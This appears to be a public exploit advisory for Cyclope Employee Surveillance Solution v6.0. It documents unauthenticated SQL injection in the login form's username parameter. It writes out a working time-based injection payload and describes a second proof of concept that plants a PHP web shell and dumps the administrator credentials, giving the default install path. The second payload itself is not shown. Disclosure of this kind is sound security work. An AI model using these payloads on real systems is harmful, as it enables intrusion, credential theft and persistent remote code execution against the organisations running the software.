# Product: Cyclope Employee Surveillance Solution v6.0
# Version: 6.0
# Vendor Site: http://www.cyclope-series.com/
# Software Download: http://www.cyclope-series.com/download/index.html
 
# Software description:
# The employee monitoring software developed by Cyclope-Series is specially designed to inform
# and equip management with statistics relating to the productivity of staff within their organization.
 
# Vulnerability:
# Due to improper input sensitization, many parameters are prone to SQL injection.
# Most importantly, the username parameter in the application&#039;s login form.
#
 
 
 
# PoC 1:
# MySql sleep for 5 seconds.
# No Authentication Required.
# Page: /index.php
# Form: login
# Vulnerable Parameter: username
# username: x&#039; or sleep(5) and &#039;1&#039;=&#039;1
# password: whatever
 
# As stated, nothing is checked before passing "username" to MySql.
# This results in MySql sleeping for 5 seconds, and a unsuccessful
# attempt.
 
# PoC 2:
# Remote Code Execution
# No Authentication Required.
# Page: /index.php
# Form: login
# Vulnerable Parameter: username
 
# Creates a small php shell in the application&#039;s root folder.
# It also has the added bonus of writing the administrator username and password
# Side note:
# This assumes a default installation. Which is located in "C:\Program Files\Cyclope\Ni4xLjA=\"
# If you are wondering what is "Ni4xLjA=", well it&#039;s the software&#039;s version number in Base64 (6.1.0).
# Using Owasp Zap, you can spider the site to find the application&#039;s root folder if ever it changes.
